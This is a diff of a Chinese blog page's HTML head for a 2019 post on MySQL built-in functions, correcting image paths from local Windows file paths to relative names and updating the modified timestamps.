@@ -86,74 +86,70 @@
 
 
 
-<meta name="description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。数据库系统功能相关学习     2 CHAR">
+<meta name="description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。  2 CHAR_LENGTH(s)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="数据库系统功能相关学习">
 <meta property="og:url" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/index.html">
 <meta property="og:site_name" content="ZSC0810の博客">
-<meta property="og:description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。数据库系统功能相关学习     2 CHAR">
+<meta property="og:description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。  2 CHAR_LENGTH(s)">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/2.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442514595.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442671851.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442904650.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443444608.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443704968.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443616729.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443863904.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444038904.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444091714.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444156446.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444223751.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444318896.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444394200.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444508607.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444626624.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444690703.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566446871033.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566447377684.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517618819.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517678446.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517812120.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517871734.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517937495.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517978782.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518003623.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518079926.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518219360.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518704807.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518753877.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566822624149.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566823276097.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826287378.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826311109.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826337973.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566826983359.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827374119.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827394929.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827407969.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827878715.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566827864811.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828117199.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828474946.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828626248.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828638674.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566828896741.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829227699.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829485987.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829535539.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566829780405.png">
-<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566831760128.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566442514595.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566442671851.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566442904650.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566443444608.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566443704968.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566443616729.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566443863904.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444038904.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444091714.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444156446.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444223751.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444318896.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444394200.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444508607.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444626624.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566444690703.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566446871033.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566447377684.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517618819.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517678446.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517812120.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517871734.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517937495.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566517978782.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566518003623.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566518079926.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566518219360.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566518704807.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566518753877.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566822624149.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566823276097.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566826287378.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566826311109.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566826337973.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566826983359.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566827374119.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566827394929.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566827407969.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566827878715.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566827864811.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566828117199.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566828474946.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566828626248.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566828638674.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566828896741.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566829227699.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566829485987.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566829535539.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566829780405.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566831760128.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1566861605141.png">
-<meta property="og:updated_time" content="2019-08-26T23:20:26.090Z">
+<meta property="og:updated_time" content="2019-08-26T23:37:14.827Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="数据库系统功能相关学习">
-<meta name="twitter:description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。数据库系统功能相关学习     2 CHAR">
-<meta name="twitter:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg">
+<meta name="twitter:description" content="目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数                  描述 1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。  2 CHAR_LENGTH(s)">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/22/数据库系统功能相关学习/1.png">
 
 
 
@@ -403,7 +399,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T07:20:26+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T07:37:14+08:00">
                 2019-08-27
